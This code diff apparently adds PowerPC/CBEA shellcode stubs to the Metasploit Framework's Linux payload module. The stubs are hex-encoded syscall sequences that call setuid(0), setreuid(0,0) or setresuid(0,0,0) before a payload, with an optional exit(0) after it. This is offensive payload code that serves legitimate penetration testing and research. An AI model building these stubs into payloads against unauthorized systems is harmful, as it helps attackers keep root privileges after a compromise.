@@ -106,6 +106,50 @@ module Msf::Payload::Linux
 
 		end
 
+		# Handle all Power/CBEA code here
+		if (test_arch.include?([ ARCH_PPC, ARCH_PPC64, ARCH_CBEA, ARCH_CBEA64 ]))
+
+			# Prepend
+
+			if (datastore['PrependSetresuid'])
+				# setresuid(0, 0, 0)
+				pre << "\x3b\xe0\x01\xff"     +#   li      r31,511                    #
+				       "\x7c\xa5\x2a\x78"     +#   xor     r5,r5,r5                   #
+				       "\x7c\x84\x22\x78"     +#   xor     r4,r4,r4                   #
+				       "\x7c\x63\x1a\x78"     +#   xor     r3,r3,r3                   #
+				       "\x38\x1f\xfe\xa5"     +#   addi    r0,r31,-347                #
+				       "\x44\xff\xff\x02"      #   sc                                 #
+			end
+
+			if (datastore['PrependSetreuid'])
+				# setreuid(0, 0)
+				pre << "\x3b\xe0\x01\xff"     +#   li      r31,511                    #
+				       "\x7c\x84\x22\x78"     +#   xor     r4,r4,r4                   #
+				       "\x7c\x63\x1a\x78"     +#   xor     r3,r3,r3                   #
+				       "\x38\x1f\xfe\x47"     +#   addi    r0,r31,-441                #
+				       "\x44\xff\xff\x02"      #   sc                                 #
+			end
+
+			if (datastore['PrependSetuid'])
+				# setuid(0)
+				pre << "\x3b\xe0\x01\xff"     +#   li      r31,511                    #
+				       "\x7c\x63\x1a\x78"     +#   xor     r3,r3,r3                   #
+				       "\x38\x1f\xfe\x18"     +#   addi    r0,r31,-488                #
+				       "\x44\xff\xff\x02"      #   sc                                 #
+			end
+
+			# Append
+
+			if (datastore['AppendExit'])
+				# exit(0)
+				app << "\x3b\xe0\x01\xff"     +#   li      r31,511                    #
+				       "\x7c\x63\x1a\x78"     +#   xor     r3,r3,r3                   #
+				       "\x38\x1f\xfe\x02"     +#   addi    r0,r31,-510                #
+				       "\x44\xff\xff\x02"      #   sc                                 #
+			end
+
+		end
+
 		return (pre + buf + app)
 	end
 
